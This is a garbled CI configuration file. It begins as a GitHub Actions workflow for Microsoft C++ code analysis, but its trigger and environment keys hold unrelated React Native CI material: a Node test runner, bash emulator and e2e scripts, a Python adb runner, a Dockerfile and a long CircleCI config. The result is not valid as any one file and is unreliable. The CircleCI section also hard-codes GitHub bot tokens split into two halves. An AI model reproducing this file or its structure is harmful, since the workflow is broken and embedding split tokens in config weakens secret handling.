# This workflow uses actions that are not certified by GitHub.
# They are provided by a third-party and are governed by
# separate terms of service, privacy policy, and support
# documentation.
#
# Find more information at:
# https://github.com/microsoft/msvc-code-analysis-action

name: Microsoft C++ Code Analysis

on: /**
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */

'use strict';

/**
 * This script runs instrumentation tests one by one with retries
 * Instrumentation tests tend to be flaky, so rerunning them individually increases
 * chances for success and reduces total average execution time.
 *
 * We assume that all instrumentation tests are flat in one folder
 * Available arguments:
 * --path - path to all .java files with tests
 * --package - com.facebook.react.tests
 * --retries [num] - how many times to retry possible flaky commands: npm install and running tests, default 1
 */

const argv = require('yargs').argv;
const async = require('async');
const child_process = require('child_process');
const fs = require('fs');
const path = require('path');

const colors = {
    GREEN: '\x1b[32m',
    RED: '\x1b[31m',
    RESET: '\x1b[0m',
};

const test_opts = {
    FILTER: new RegExp(argv.filter || '.*', 'i'),
    IGNORE: argv.ignore || null,
    PACKAGE: argv.package || 'com.facebook.react.tests',
    PATH: argv.path || './ReactAndroid/src/androidTest/java/com/facebook/react/tests',
    RETRIES: parseInt(argv.retries || 2, 10),

    TEST_TIMEOUT: parseInt(argv['test-timeout'] || 1000 * 60 * 10, 10),

    OFFSET: argv.offset,
    COUNT: argv.count,
};

let max_test_class_length = Number.NEGATIVE_INFINITY;

let testClasses = fs.readdirSync(path.resolve(process.cwd(), test_opts.PATH))
    .filter((file) => {
        return file.endsWith('.java');
    }).map((clazz) => {
        return path.basename(clazz, '.java');
    });

if (test_opts.IGNORE) {
    test_opts.IGNORE = new RegExp(test_opts.IGNORE, 'i');
    testClasses = testClasses.filter(className => {
        return !test_opts.IGNORE.test(className);
    });
}

testClasses = testClasses.map((clazz) => {
    return test_opts.PACKAGE + '.' + clazz;
}).filter((clazz) => {
    return test_opts.FILTER.test(clazz);
});

// only process subset of the tests at corresponding offset and count if args provided
if (test_opts.COUNT != null && test_opts.OFFSET != null) {
    const start = test_opts.COUNT * test_opts.OFFSET;
    const end = start + test_opts.COUNT;

    if (start >= testClasses.length) {
        testClasses = [];
    } else if (end >= testClasses.length) {
        testClasses = testClasses.slice(start);
    } else {
        testClasses = testClasses.slice(start, end);
    }
}

async.mapSeries(testClasses, (clazz, callback) => {
    if (clazz.length > max_test_class_length) {
        max_test_class_length = clazz.length;
    }

    return async.retry(test_opts.RETRIES, (retryCb) => {
        const test_process = child_process.spawn('./.circleci/Dockerfiles/scripts/run-instrumentation-tests-via-adb-shell.sh', [test_opts.PACKAGE, clazz], {
            stdio: 'inherit',
        });

        const timeout = setTimeout(() => {
            test_process.kill();
        }, test_opts.TEST_TIMEOUT);

        test_process.on('error', (err) => {
            clearTimeout(timeout);
            retryCb(err);
        });

        test_process.on('exit', (code) => {
            clearTimeout(timeout);

            if (code !== 0) {
                return retryCb(new Error(`Process exited with code: ${code}`));
            }

            return retryCb();
        });
    }, (err) => {
        return callback(null, {
            name: clazz,
            status: err ? 'failure' : 'success',
        });
    });
}, (err, results) => {
    print_test_suite_results(results);

    const failures = results.filter((test) => {
        return test.status === 'failure';
    });

    return failures.length === 0 ? process.exit(0) : process.exit(1);
});

function print_test_suite_results(results) {
    console.log('\n\nTest Suite Results:\n');

    let color;
    let failing_suites = 0;
    let passing_suites = 0;

    function pad_output(num_chars) {
        let i = 0;

        while (i < num_chars) {
            process.stdout.write(' ');
            i++;
        }
    }
    results.forEach((test) => {
        if (test.status === 'success') {
            color = colors.GREEN;
            passing_suites++;
        } else if (test.status === 'failure') {
            color = colors.RED;
            failing_suites++;
        }

        process.stdout.write(color);
        process.stdout.write(test.name);
        pad_output((max_test_class_length - test.name.length) + 8);
        process.stdout.write(test.status);
        process.stdout.write(`${colors.RESET}\n`);
    });

    console.log(`\n${passing_suites} passing, ${failing_suites} failing!`);
}
  push: #!/bin/bash
# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

# for buck gen
mount -o remount,exec /dev/shm

AVD_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)

# create virtual device
echo no | android create avd -n "$AVD_UUID" -f -t android-21 --abi default/armeabi-v7a

# emulator setup
emulator64-arm -avd $AVD_UUID -no-skin -no-audio -no-window -no-boot-anim &
bootanim=""
until [[ "$bootanim" =~ "stopped" ]]; do
    sleep 5
    bootanim=$(adb -e shell getprop init.svc.bootanim 2>&1)
    echo "boot animation status=$bootanim"
done

set -x

# solve issue with max user watches limit
echo 65536 | tee -a /proc/sys/fs/inotify/max_user_watches
watchman shutdown-server

# integration tests
# build JS bundle for instrumentation tests
node cli.js bundle --platform android --dev true --entry-file ReactAndroid/src/androidTest/js/TestBundle.js --bundle-output ReactAndroid/src/androidTest/assets/AndroidTestBundle.js

# build test APK
# shellcheck disable=SC1091
source ./scripts/android-setup.sh && NO_BUCKD=1 retry3 buck install ReactAndroid/src/androidTest/buck-runner:instrumentation-tests --config build.threads=1

# run installed apk with tests
node ./.circleci/Dockerfiles/scripts/run-android-ci-instrumentation-tests.js "$*"
exit $?
    branches: [ "main" ]
  pull_request: #!/bin/bash
# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

# set default environment variables
UNIT_TESTS_BUILD_THREADS="${UNIT_TESTS_BUILD_THREADS:-1}"

# for buck gen
mount -o remount,exec /dev/shm

set -x

# run unit tests
buck test ReactAndroid/src/test/... --config build.threads="$UNIT_TESTS_BUILD_THREADS"
    branches: [ "main" ]
  schedule: #!/bin/bash
# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

set -ex

# set default environment variables
ROOT=$(pwd)
SCRIPTS=$(pwd)/scripts

RUN_ANDROID=0
RUN_CLI_INSTALL=1
RUN_IOS=0
RUN_JS=0

RETRY_COUNT=${RETRY_COUNT:-2}
AVD_UUID=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
ANDROID_NPM_DEPS="appium@1.5.1 mocha@2.4.5 wd@0.3.11 colors@1.0.3 pretty-data2@0.40.1"
CLI_PACKAGE="$ROOT/react-native-cli/react-native-cli-*.tgz"
PACKAGE="$ROOT/react-native-*.tgz"

# solve issue with max user watches limit
echo 65536 | tee -a /proc/sys/fs/inotify/max_user_watches
watchman shutdown-server

# retries command on failure
# $1 -- max attempts
# $2 -- command to run
function retry() {
    local -r -i max_attempts="$1"; shift
    local -r cmd="$*"
    local -i attempt_num=1

    until $cmd; do
        if (( attempt_num == max_attempts )); then
            echo "Execution of '$cmd' failed; no more attempts left"
            return 1
        else
            (( attempt_num++ ))
            echo "Execution of '$cmd' failed; retrying for attempt number $attempt_num..."
        fi
    done
}

# parse command line args & flags
while :; do
  case "$1" in
    --android)
      RUN_ANDROID=1
      shift
      ;;

    --ios)
      RUN_IOS=1
      shift
      ;;

    --js)
      RUN_JS=1
      shift
      ;;

    --skip-cli-install)
      RUN_CLI_INSTALL=0
      shift
      ;;

    *)
      break
  esac
done

function e2e_suite() {
    cd "$ROOT"

    if [ $RUN_ANDROID -eq 0 ] && [ $RUN_IOS -eq 0 ] && [ $RUN_JS -eq 0 ]; then
      echo "No e2e tests specified!"
      return 0
    fi

    # create temp dir
    TEMP_DIR=$(mktemp -d /tmp/react-native-XXXXXXXX)

    # To make sure we actually installed the local version
    # of react-native, we will create a temp file inside the template
    # and check that it exists after `react-native init
    IOS_MARKER="$(mktemp "$ROOT"/template/ios/HelloWorld/XXXXXXXX)"
    ANDROID_MARKER="$(mktemp "$ROOT"/template/android/XXXXXXXX)"

    # install CLI
    cd react-native-cli
    npm pack
    cd ..

    # can skip cli install for non sudo mode
    if [ $RUN_CLI_INSTALL -ne 0 ]; then
      if ! npm install -g "$CLI_PACKAGE"
      then
        echo "Could not install react-native-cli globally, please run in su mode"
        echo "Or with --skip-cli-install to skip this step"
        return 1
      fi
    fi

    if [ $RUN_ANDROID -ne 0 ]; then
        set +ex

        # create virtual device
        if ! android list avd | grep "$AVD_UUID" > /dev/null; then
            echo no | android create avd -n "$AVD_UUID" -f -t android-21 --abi default/armeabi-v7a
        fi

        # newline at end of adb devices call and first line is headers
        DEVICE_COUNT=$(adb devices | wc -l)
        ((DEVICE_COUNT -= 2))

        # will always kill an existing emulator if one exists for fresh setup
        if [[ $DEVICE_COUNT -ge 1 ]]; then
            adb emu kill
        fi

        # emulator setup
        emulator64-arm -avd "$AVD_UUID" -no-skin -no-audio -no-window -no-boot-anim &

        bootanim=""
        # shellcheck disable=SC2076
        until [[ "$bootanim" =~ "stopped" ]]; do
            sleep 5
            bootanim=$(adb -e shell getprop init.svc.bootanim 2>&1)
            echo "boot animation status=$bootanim"
        done

        set -ex

      if ! ./gradlew :ReactAndroid:installArchives -Pjobs=1 -Dorg.gradle.jvmargs="-Xmx512m -XX:+HeapDumpOnOutOfMemoryError"
      then
        echo "Failed to compile Android binaries"
        return 1
      fi
    fi

    if ! npm pack
    then
      echo "Failed to pack react-native"
      return 1
    fi

    cd "$TEMP_DIR"

    if ! retry "$RETRY_COUNT" react-native init EndToEndTest --version "$PACKAGE" --npm
    then
      echo "Failed to execute react-native init"
      echo "Most common reason is npm registry connectivity, try again"
      return 1
    fi

    cd EndToEndTest

    # android tests
    if [ $RUN_ANDROID -ne 0 ]; then
      echo "Running an Android e2e test"
      echo "Installing e2e framework"

      if ! retry "$RETRY_COUNT" npm install --save-dev "$ANDROID_NPM_DEPS" --silent >> /dev/null
      then
        echo "Failed to install appium"
        echo "Most common reason is npm registry connectivity, try again"
        return 1
      fi

      cp "$SCRIPTS/android-e2e-test.js" android-e2e-test.js

      (
      cd android || exit
      echo "Downloading Maven deps"
      ./gradlew :app:copyDownloadableDepsToLibs
      )

      keytool -genkey -v -keystore android/keystores/debug.keystore -storepass android -alias androiddebugkey -keypass android -dname "CN=Android Debug,O=Android,C=US"

      node ./node_modules/.bin/appium >> /dev/null &
      APPIUM_PID=$!
      echo "Starting appium server $APPIUM_PID"

      echo "Building app"
      buck build android/app

      # hack to get node unhung (kill buckd)
      if ! kill -9 "$(pgrep java)"
      then
        echo "could not execute Buck build, is it installed and in PATH?"
        return 1
      fi

      echo "Starting Metro"
      npm start >> /dev/null &
      SERVER_PID=$!
      sleep 15

      echo "Executing android e2e test"
      if ! retry "$RETRY_COUNT" node node_modules/.bin/_mocha android-e2e-test.js
      then
        echo "Failed to run Android e2e tests"
        echo "Most likely the code is broken"
        return 1
      fi

      # kill packager process
      if kill -0 "$SERVER_PID"; then
        echo "Killing packager $SERVER_PID"
        kill -9 "$SERVER_PID"
      fi

      # kill appium process
      if kill -0 "$APPIUM_PID"; then
        echo "Killing appium $APPIUM_PID"
        kill -9 "$APPIUM_PID"
      fi

    fi

    # ios tests
    if [ $RUN_IOS -ne 0 ]; then
      echo "Running ios e2e tests not yet implemented for docker!"
    fi

    # js tests
    if [ $RUN_JS -ne 0 ]; then
      # Check the packager produces a bundle (doesn't throw an error)
      if ! react-native bundle --max-workers 1 --platform android --dev true --entry-file index.js --bundle-output android-bundle.js
      then
        echo "Could not build android bundle"
        return 1
      fi

      if ! react-native bundle --max-workers 1 --platform ios --dev true --entry-file index.js --bundle-output ios-bundle.js
      then
        echo "Could not build iOS bundle"
        return 1
      fi

    # directory cleanup
    rm "$IOS_MARKER"
    rm "$ANDROID_MARKER"

    return 0
}

retry "$RETRY_COUNT" e2e_suite
    - cron: #!/bin/bash
# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

# shellcheck disable=SC1117
# Python script to run instrumentation tests, copied from https://github.com/circleci/circle-dummy-android
# Example: ./scripts/run-android-instrumentation-tests.sh com.facebook.react.tests com.facebook.react.tests.ReactPickerTestCase
#
export PATH="$ANDROID_HOME/platform-tools:$ANDROID_HOME/tools:$PATH"

# clear the logs
adb logcat -c

# run tests and check output
python - "$1" "$2" << END

import re
import subprocess as sp
import sys
import threading
import time

done = False

test_app = sys.argv[1]
test_class = None

if len(sys.argv) > 2:
  test_class = sys.argv[2]

def update():
  # prevent CircleCI from killing the process for inactivity
  while not done:
    time.sleep(5)
    print "Running in background.  Waiting for 'adb' command response..."

t = threading.Thread(target=update)
t.dameon = True
t.start()

def run():
  sp.Popen(['adb', 'wait-for-device']).communicate()
  if (test_class != None):
    p = sp.Popen('adb shell am instrument -w -e class %s %s/android.support.test.runner.AndroidJUnitRunner'
      % (test_class, test_app), shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
  else :
    p = sp.Popen('adb shell am instrument -w %s/android.support.test.runner.AndroidJUnitRunner'
      % (test_app), shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
  return p.communicate()

success = re.compile(r'OK \(\d+ test(s)?\)')
stdout, stderr = run()

done = True
print stderr
print stdout

if success.search(stderr + stdout):
  sys.exit(0)
else:
  # dump the logs
  sp.Popen(['adb', 'logcat', '-d']).communicate()
  sys.exit(1) # make sure we fail if the test failed
END

RETVAL=$?

exit $RETVAL

env: # Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.
#
# This image builds upon the React Native Community Android image:
# https://github.com/react-native-community/docker-android
#
# The base image is expected to remain relatively stable, and only
# needs to be updated when major dependencies such as the Android
# SDK or NDK are updated.
#
# In this Android Test image, we download the latest dependencies
# and build a Android application that can be used to run the
# tests specified in the scripts/ directory.
#
FROM reactnativecommunity/react-native-android:3.2

LABEL Description="React Native Android Test Image"
LABEL maintainer="Héctor Ramos <hector@fb.com>"

# set default environment variables
ENV GRADLE_OPTS="-Dorg.gradle.daemon=false -Dorg.gradle.jvmargs=\"-Xmx512m -XX:+HeapDumpOnOutOfMemoryError\""
ENV JAVA_TOOL_OPTIONS="-Dfile.encoding=UTF8"

ADD .buckconfig /app/.buckconfig
ADD .buckjavaargs /app/.buckjavaargs
ADD Libraries /app/Libraries
ADD ReactAndroid /app/ReactAndroid
ADD ReactCommon /app/ReactCommon
ADD React /app/React
ADD keystores /app/keystores
ADD packages/react-native-codegen /app/packages/react-native-codegen
ADD tools /app/tools

WORKDIR /app

RUN buck fetch ReactAndroid/src/test/java/com/facebook/react/modules
RUN buck fetch ReactAndroid/src/main/java/com/facebook/react
RUN buck fetch ReactAndroid/src/main/java/com/facebook/react/shell
RUN buck fetch ReactAndroid/src/test/...
RUN buck fetch ReactAndroid/src/androidTest/...

RUN buck build ReactAndroid/src/main/java/com/facebook/react
RUN buck build ReactAndroid/src/main/java/com/facebook/react/shell

ADD . /app

RUN yarn

RUN ./gradlew :ReactAndroid:downloadBoost :ReactAndroid:downloadDoubleConversion :ReactAndroid:downloadFolly :ReactAndroid:downloadGlog

RUN ./gradlew :ReactAndroid:packageReactNdkLibsForBuck -Pjobs=1
  # Path to the CMake build directory.
  build: ' version: 2.1

# -------------------------
#        ORBS
# -------------------------

orbs:
  win: circleci/windows@2.4.0

# -------------------------
#        DEFAULTS
# -------------------------
defaults: &defaults
  working_directory: ~/react-native
  environment:
    - GIT_COMMIT_DESC: git log --format=oneline -n 1 $CIRCLE_SHA1
    # The public github tokens are publicly visible by design
    - PUBLIC_PULLBOT_GITHUB_TOKEN_A: &github_pullbot_token_a "a6edf8e8d40ce4e8b11a"
    - PUBLIC_PULLBOT_GITHUB_TOKEN_B: &github_pullbot_token_b "150e1341f4dd9c944d2a"
    - PUBLIC_ANALYSISBOT_GITHUB_TOKEN_A: &github_analysisbot_token_a "312d354b5c36f082cfe9"
    - PUBLIC_ANALYSISBOT_GITHUB_TOKEN_B: &github_analysisbot_token_b "07973d757026bdd9f196"

# -------------------------
#        EXECUTORS
# -------------------------
executors:
  nodelts:
    <<: *defaults
    docker:
      - image: circleci/node:14
  nodeprevlts:
    <<: *defaults
    docker:
      - image: circleci/node:12
  reactnativeandroid:
    <<: *defaults
    docker:
      - image: reactnativecommunity/react-native-android:3.2
    resource_class: "large"
    environment:
      - TERM: "dumb"
      - ADB_INSTALL_TIMEOUT: 10
      - _JAVA_OPTIONS: "-XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap"
      - GRADLE_OPTS: '-Dorg.gradle.daemon=false -Dorg.gradle.jvmargs="-XX:+HeapDumpOnOutOfMemoryError"'
      - BUILD_THREADS: 2
      # Repeated here, as the environment key in this executor will overwrite the one in defaults
      - PUBLIC_ANALYSISBOT_GITHUB_TOKEN_A: *github_analysisbot_token_a
      - PUBLIC_ANALYSISBOT_GITHUB_TOKEN_B: *github_analysisbot_token_b
      - PUBLIC_PULLBOT_GITHUB_TOKEN_A: *github_pullbot_token_a
      - PUBLIC_PULLBOT_GITHUB_TOKEN_B: *github_pullbot_token_b
  reactnativeios:
    <<: *defaults
    macos:
      xcode: &_XCODE_VERSION "12.4.0"

# -------------------------
#        COMMANDS
# -------------------------
commands:
  restore_cache_checkout:
    parameters:
      checkout_type:
        type: string
        default: node
    steps:
      - restore_cache:
          key: v1-repo-{{ .Environment.CIRCLE_SHA1 }}-<< parameters.checkout_type >>

  setup_artifacts:
    steps:
      - run:
          name: Initial Setup
          command: mkdir -p ./reports/{buck,build,junit,outputs}

  run_yarn:
    steps:
      - restore_cache:
          keys:
            - v4-yarn-cache-{{ arch }}-{{ checksum "yarn.lock" }}
      - run:
          name: "Yarn: Install Dependencies"
          command: |
            # Skip yarn install on metro bump commits as the package is not yet
            # available on npm
            if [[ $(echo "$GIT_COMMIT_DESC" | grep -c "Bump metro@") -eq 0 ]]; then
              yarn install --non-interactive --cache-folder ~/.cache/yarn
            fi
      - save_cache:
          paths:
            - ~/.cache/yarn
          key: v4-yarn-cache-{{ arch }}-{{ checksum "yarn.lock" }}

  install_buck_tooling:
    steps:
      - restore_cache:
          keys:
            - v3-buck-v2019.01.10.01-{{ checksum "scripts/circleci/buck_fetch.sh" }}}
      - run:
          name: Install BUCK
          command: |
            buck --version
            # Install related tooling
            if [[ ! -e ~/okbuck ]]; then
              git clone https://github.com/uber/okbuck.git ~/okbuck --depth=1
            fi
      - save_cache:
          paths:
            - ~/buck
            - ~/okbuck
          key: v3-buck-v2019.01.10.01-{{ checksum "scripts/circleci/buck_fetch.sh" }}

  install_github_bot_deps:
    steps:
      - run:
          name: "Yarn: Install dependencies (GitHub bots)"
          command: cd bots && yarn install --non-interactive --cache-folder ~/.cache/yarn

  brew_install:
    parameters:
      package:
        description: Homebrew package to install
        type: string
    steps:
      - run:
          name: "Brew: Install << parameters.package >>"
          command: HOMEBREW_NO_AUTO_UPDATE=1 brew install << parameters.package >> >/dev/null

  with_brew_cache_span:
    parameters:
      steps:
        type: steps
    steps:
      - restore_cache:
          keys:
            - v4-brew
      - steps: << parameters.steps >>
      - save_cache:
          paths:
            - /usr/local/Homebrew
            - ~/Library/Caches/Homebrew
          key: v4-brew

  with_rntester_pods_cache_span:
    parameters:
      steps:
        type: steps
    steps:
      - run:
          name: Setup CocoaPods cache
          # Copy packages/rn-tester/Podfile.lock since it can be changed by pod install
          command: cp packages/rn-tester/Podfile.lock packages/rn-tester/Podfile.lock.bak
      - restore_cache:
          keys:
            # The committed lockfile is generated using USE_FRAMEWORKS=0 and USE_HERMES=0 so it could load an outdated cache if a change
            # only affects the frameworks or hermes config. To help prevent this also cache based on the content of Podfile.
            - v3-pods-{{ .Environment.CIRCLE_JOB }}-{{ checksum "packages/rn-tester/Podfile.lock.bak" }}-{{ checksum "packages/rn-tester/Podfile" }}
      - steps: << parameters.steps >>
      - save_cache:
          paths:
            - packages/rn-tester/Pods
          key: v3-pods-{{ .Environment.CIRCLE_JOB }}-{{ checksum "packages/rn-tester/Podfile.lock.bak" }}-{{ checksum "packages/rn-tester/Podfile" }}

  download_gradle_dependencies:
    steps:
      - restore_cache:
          keys:
            - v1-gradle-{{ checksum "ReactAndroid/build.gradle" }}-{{ checksum "scripts/circleci/gradle_download_deps.sh" }}
      - run:
          name: Download Dependencies Using Gradle
          command: ./scripts/circleci/gradle_download_deps.sh
      - save_cache:
          paths:
            - ~/.gradle
            - ReactAndroid/build/downloads
            - ReactAndroid/build/third-party-ndk
          key: v1-gradle-{{ checksum "ReactAndroid/build.gradle" }}-{{ checksum "scripts/circleci/gradle_download_deps.sh" }}

  download_buck_dependencies:
    steps:
      - run:
          name: Download Dependencies Using Buck
          command: ./scripts/circleci/buck_fetch.sh

  run_e2e:
    parameters:
      platform:
        description: Target platform
        type: enum
        enum: ["android", "ios", "js"]
        default: "js"
      retries:
        description: How many times the job should try to run these tests
        type: integer
        default: 3
    steps:
      - run:
          name: "Run Tests: << parameters.platform >> End-to-End Tests"
          command: node ./scripts/run-ci-e2e-tests.js --<< parameters.platform >> --retries << parameters.retries >>

  report_bundle_size:
    parameters:
      platform:
        description: Target platform
        type: enum
        enum: ["android", "ios"]
    steps:
      - install_github_bot_deps
      - run:
          name: Report size of RNTester.app (analysis-bot)
          command: GITHUB_TOKEN="$PUBLIC_ANALYSISBOT_GITHUB_TOKEN_A""$PUBLIC_ANALYSISBOT_GITHUB_TOKEN_B" scripts/circleci/report-bundle-size.sh << parameters.platform >>

# -------------------------
#          JOBS
# -------------------------
jobs:
  setup:
    parameters:
      executor:
        type: executor
        default: nodelts
      checkout_type:
        type: string
        default: node
    executor: << parameters.executor >>
    steps:
      - checkout
      - save_cache:
          key: v1-repo-{{ .Environment.CIRCLE_SHA1 }}-<< parameters.checkout_type >>
          paths:
            - ~/react-native

  # -------------------------
  #     JOBS: Analyze PR
  # -------------------------
  # Analyze pull request and raise any lint/flow issues.
  # Issues will be posted to the PR itself via GitHub bots.
  # This workflow should only fail if the bots fail to run.
  analyze_pr:
    executor: reactnativeandroid
    steps:
      - restore_cache_checkout:
          checkout_type: android
      - run_yarn

      - install_github_bot_deps

      # Note: The yarn gpg key needs to be refreshed to work around https://github.com/yarnpkg/yarn/issues/7866
      - run:
          name: Install additional GitHub bot dependencies
          command: |
            curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | apt-key add -
            apt update && apt install -y shellcheck jq

      - run:
          name: Run linters against modified files (analysis-bot)
          command: GITHUB_TOKEN="$PUBLIC_ANALYSISBOT_GITHUB_TOKEN_A""$PUBLIC_ANALYSISBOT_GITHUB_TOKEN_B" yarn lint-ci
          when: always

      - run:
          name: Analyze Pull Request (pull-bot)
          command: |
            cd bots
            DANGER_GITHUB_API_TOKEN="$PUBLIC_PULLBOT_GITHUB_TOKEN_A""$PUBLIC_PULLBOT_GITHUB_TOKEN_B" yarn danger ci --use-github-checks
          when: always

  # -------------------------
  #    JOBS: Analyze Code
  # -------------------------
  analyze_code:
    executor: reactnativeandroid
    steps:
      - restore_cache_checkout:
          checkout_type: android
      - setup_artifacts
      - run_yarn

      - run:
          name: Lint code
          command: scripts/circleci/exec_swallow_error.sh yarn lint --format junit -o ./reports/junit/eslint/results.xml
          when: always

      - run:
          name: Lint Java
          command: scripts/circleci/exec_swallow_error.sh yarn lint-java --check
          when: always

      - run:
          name: Check for errors in code using Flow (iOS)
          command: yarn flow-check-ios
          when: always

      - run:
          name: Check for errors in code using Flow (Android)
          command: yarn flow-check-android
          when: always

      - run:
          name: Sanity checks
          command: |
            ./scripts/circleci/check_license.sh
            ./scripts/circleci/validate_yarn_lockfile.sh
          when: always

      - run:
          name: Check formatting
          command: yarn run format-check
          when: always

      - store_test_results:
          path: ./reports/junit

  # -------------------------
  #   JOBS: Test JavaScript
  # -------------------------
  test_js:
    parameters:
      executor:
        type: executor
        default: nodelts
      run_disabled_tests:
        type: boolean
        default: false
    executor: << parameters.executor >>
    steps:
      - restore_cache_checkout:
          checkout_type: node
      - setup_artifacts
      - run_yarn
      - run:
          name: Install rsync
          command: sudo apt-get install rsync

      # -------------------------
      # Run JavaScript tests
      - run:
          name: "Run Tests: JavaScript Tests"
          command: node ./scripts/run-ci-javascript-tests.js --maxWorkers 2
      - run_e2e:
          platform: js

      # Optionally, run disabled tests
      - when:
          condition: << parameters.run_disabled_tests >>
          steps:
            - run: echo "Failing tests may be moved here temporarily."
      # -------------------------

      - store_test_results:
          path: ./reports/junit

  # -------------------------
  #     JOBS: Test iOS
  # -------------------------
  test_ios:
    executor: reactnativeios
    parameters:
      use_frameworks:
        type: boolean
        default: false
      use_hermes:
        type: boolean
        default: false
      run_unit_tests:
        description: Specifies whether unit tests should run.
        type: boolean
        default: false
      run_detox_tests:
        description: Specifies whether Detox e2e tests should run.
        type: boolean
        default: false
      run_disabled_tests:
        description: Specifies whether disabled tests should run. Set this to true to debug failing tests.
        type: boolean
        default: false
    environment:
      - REPORTS_DIR: "./reports/junit"
    steps:
      - restore_cache_checkout:
          checkout_type: ios
      - setup_artifacts
      - run_yarn

      - run: |
          cd packages/rn-tester
          bundle check || bundle install
      - run:
          name: Boot iPhone Simulator
          command: source scripts/.tests.env && xcrun simctl boot "$IOS_DEVICE" || true

      - run:
          name: Configure Environment Variables
          command: |
            echo 'export PATH=/usr/local/opt/node@12/bin:$PATH' >> $BASH_ENV
            source $BASH_ENV

      - with_brew_cache_span:
          steps:
            - brew_install:
                package: watchman
            - brew_install:
                package: node@12
            - run:
                name: "Brew: Tap wix/brew"
                command: HOMEBREW_NO_AUTO_UPDATE=1 brew tap wix/brew >/dev/null
            - brew_install:
                package: applesimutils

      - run:
          name: Configure Watchman
          command: touch .watchmanconfig

      - when:
          condition: << parameters.use_frameworks >>
          steps:
            - run:
                name: Set USE_FRAMEWORKS=1
                command: echo "export USE_FRAMEWORKS=1" >> $BASH_ENV

      - when:
          condition: << parameters.use_hermes >>
          steps:
            - run:
                name: Set USE_HERMES=1
                command: echo "export USE_HERMES=1" >> $BASH_ENV

      - run:
          name: Setup the CocoaPods environment
          command: pod setup

      - with_rntester_pods_cache_span:
          steps:
            - run:
                name: Generate RNTesterPods Workspace
                command: cd packages/rn-tester && USE_FABRIC=1 bundle exec pod install --verbose

      # -------------------------
      # Runs iOS unit tests
      - when:
          condition: << parameters.run_unit_tests >>
          steps:
            - run:
                name: "Run Tests: iOS Unit and Integration Tests"
                command: yarn test-ios
      # Runs iOS Detox e2e tests
      - when:
          condition: << parameters.run_detox_tests >>
          steps:
            - run:
                name: "Run Tests: Detox iOS End-to-End Tests"
                command: yarn run build-ios-e2e && yarn run test-ios-e2e

      # Optionally, run disabled tests
      - when:
          condition: << parameters.run_disabled_tests >>
          steps:
            - run: echo "Failing tests may be moved here temporarily."
            - run:
                name: "Run Tests: CocoaPods"
                command: ./scripts/process-podspecs.sh
            - run:
                name: Free up port 8081 for iOS End-to-End Tests
                command: |
                  # free up port 8081 for the packager before running tests
                  set +eo pipefail
                  lsof -i tcp:8081 | awk 'NR!=1 {print $2}' | xargs kill
                  set -eo pipefail
            - run_e2e:
                platform: ios
      # -------------------------

      # Collect Results
      - report_bundle_size:
          platform: ios
      - store_test_results:
          path: ./reports/junit

  # -------------------------
  #    JOBS: Test Android
  # -------------------------
  test_android:
    executor: reactnativeandroid
    parameters:
      run_disabled_tests:
        type: boolean
        default: false
    steps:
      - restore_cache_checkout:
          checkout_type: android
      - setup_artifacts
      - run_yarn

      # Validate Android SDK installation and packages
      - run:
          name: Validate Android SDK Install
          command: ./scripts/validate-android-sdk.sh

      # Starting emulator in advance as it takes some time to boot.
      - run:
          name: Create Android Virtual Device
          command: source scripts/android-setup.sh && createAVD
      - run:
          name: Launch Android Virtual Device in Background
          command: source scripts/android-setup.sh && launchAVD
          background: true

      # Keep configuring Android dependencies while AVD boots up
      # Note: The yarn gpg key needs to be refreshed to work around https://github.com/yarnpkg/yarn/issues/7866
      - run:
          name: Install rsync, zip
          command: |
            curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | apt-key add -
            apt-get update -y && apt-get install rsync zip -y

      # Install Buck
      - install_buck_tooling

      # Validate Android test environment (including Buck)
      - run:
          name: Validate Android Test Environment
          command: ./scripts/validate-android-test-env.sh

      - download_buck_dependencies
      - download_gradle_dependencies

      # Build and compile
      - run:
          name: Build Android App
          command: |
            buck build ReactAndroid/src/main/java/com/facebook/react
            buck build ReactAndroid/src/main/java/com/facebook/react/shell
      - run:
          name: Compile Native Libs for Unit and Integration Tests
          command: ./gradlew :ReactAndroid:packageReactNdkLibsForBuck -Pjobs=$BUILD_THREADS
          no_output_timeout: 6m

      # Build JavaScript Bundle for instrumentation tests
      - run:
          name: Build JavaScript Bundle
          command: node cli.js bundle --max-workers 2 --platform android --dev true --entry-file ReactAndroid/src/androidTest/js/TestBundle.js --bundle-output ReactAndroid/src/androidTest/assets/AndroidTestBundle.js

      # Wait for AVD to finish booting before running tests
      - run:
          name: Wait for Android Virtual Device
          command: source scripts/android-setup.sh && waitForAVD

      - run:
          name: Assemble RNTester App
          command: ./gradlew packages:rn-tester:android:app:assembleRelease

      # -------------------------
      # Run Android tests
      - run:
          name: "Run Tests: Android Unit Tests"
          command: buck test ReactAndroid/src/test/... --config build.threads=$BUILD_THREADS --xml ./reports/buck/all-results-raw.xml
      - run:
          name: "Build Tests: Android Instrumentation Tests"
          # Here, just build the instrumentation tests. There is a known issue with installing the APK to android-21+ emulator.
          command: |
            if [[ ! -e ReactAndroid/src/androidTest/assets/AndroidTestBundle.js ]]; then
              echo "JavaScript bundle missing, cannot run instrumentation tests. Verify Build JavaScript Bundle step completed successfully."; exit 1;
            fi
            source scripts/android-setup.sh && NO_BUCKD=1 retry3 timeout 300 buck build ReactAndroid/src/androidTest/buck-runner:instrumentation-tests --config build.threads=$BUILD_THREADS

      # Optionally, run disabled tests
      - when:
          condition: << parameters.run_disabled_tests >>
          steps:
